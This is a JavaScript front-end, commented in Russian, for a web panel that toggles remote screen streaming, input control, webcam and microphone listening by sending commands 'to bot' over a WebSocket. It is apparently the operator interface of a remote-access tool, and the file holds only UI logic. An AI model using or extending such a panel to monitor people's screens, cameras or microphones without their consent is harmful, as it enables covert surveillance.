/* ==========================================================================
   1. ИНИЦИАЛИЗАЦИЯ И СОСТОЯНИЕ
   ========================================================================== */
import { initControlConnection } from './modules/websocket/connection.js';

document.addEventListener('DOMContentLoaded', () => {
    // Мгновенный сброс UI в offline при загрузке
    if (window.AppState) AppState.reset();

    // Запуск сетевого модуля
    initControlConnection();

    // Первичная отрисовка данных клиента
    if (window.initClientUI) window.initClientUI();

    /* ==========================================================================
       2. ЛОГИКА САЙДБАРА И НАВИГАЦИИ
       ========================================================================== */

    const sidebar = document.getElementById('sidebar');
    const sidebarToggle = document.getElementById('sidebarToggle');
    const header = document.getElementById('header');

    // Переключатель сворачивания сайдбара
    if (sidebarToggle && sidebar) {
        sidebarToggle.onclick = (e) => {
            e.stopPropagation();
            sidebar.classList.toggle('hidden');
            // Ждем окончания CSS transition (0.3s) и уведомляем систему о смене размера
            setTimeout(() => window.dispatchEvent(new Event('resize')), 300);
        };
    }

    // Переключение режимов (Desktop / Webcam)
    document.querySelectorAll('.nav-item').forEach(item => {
        item.onclick = () => {
            const mode = item.dataset.target;

            // Визуальное переключение в меню
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            item.classList.add('active');

            // Смена активной группы кнопок в хедере
            if (header) header.dataset.activeMode = mode;

            // Переключение панелей вывода
            document.querySelectorAll('.view-panel').forEach(p =>
                p.classList.toggle('active', p.id === `view-${mode}`)
            );

            // Остановка стримов при смене вкладки (безопасность ресурсов)
            handleAutoStop(mode);

            window.dispatchEvent(new Event('resize'));
        };
    });

    /* ==========================================================================
       3. УПРАВЛЕНИЕ ФУНКЦИЯМИ (Action Controllers)
       ========================================================================== */

    const toggleAction = (id, stateObj, key, mod, cmds) => {
        if (!stateObj) return;

        stateObj[key] = !stateObj[key];
        const isActive = stateObj[key];

        const btn = document.getElementById(id);
        if (btn) btn.classList.toggle('active', isActive);

        window.sendToBot?.(mod, isActive ? cmds[0] : cmds[1]);
    };

    // Автоматическая остановка при переключении режима
    const handleAutoStop = (currentMode) => {
        if (currentMode !== 'desktop') {
            if (AppState.desktop.observe) window.toggleObserve();
            if (AppState.desktop.control) window.toggleControl();
        }
        if (currentMode !== 'webcam' && AppState.webcam.active) {
            window.toggleWebcam();
        }
    };

    // Экспорт функций управления в глобальную область
    window.toggleObserve = () => toggleAction('btn-desktop-stream', AppState.desktop, 'observe', 'ScreenWatch', ['start_stream', 'stop_stream']);
    window.toggleControl = () => toggleAction('btn-desktop-control', AppState.desktop, 'control', 'InputForge', ['start_control', 'stop_control']);
    window.toggleWebcam  = () => toggleAction('btn-webcam-stream', AppState.webcam, 'active', 'CamGaze', ['start', 'stop']);

    // Привязка кликов к кнопкам
    const bindClick = (id, fn) => {
        const el = document.getElementById(id);
        if (el) el.onclick = fn;
    };

    bindClick('btn-desktop-stream', window.toggleObserve);
    bindClick('btn-desktop-control', window.toggleControl);
    bindClick('btn-webcam-stream', window.toggleWebcam);
    bindClick('btn-audio-pc', () => toggleAction('btn-audio-pc', AppState.audio, 'output', 'AudioStream', ['listen_on', 'listen_off']));
    bindClick('btn-audio-mic', () => toggleAction('btn-audio-mic', AppState.audio, 'input', 'AudioStream', ['mic_on', 'mic_off']));

    /* ==========================================================================
       4. ДОПОЛНИТЕЛЬНЫЕ ЭФФЕКТЫ (Cinema Mode)
       ========================================================================== */
    document.querySelectorAll('.fullscreen-btn').forEach(btn => {
        btn.onclick = () => {
            document.body.classList.toggle('cinema-mode');
            const icon = btn.querySelector('i');
            if (icon) {
                icon.classList.toggle('fa-expand');
                icon.classList.toggle('fa-compress');
            }
            window.dispatchEvent(new Event('resize'));
        };
    });
});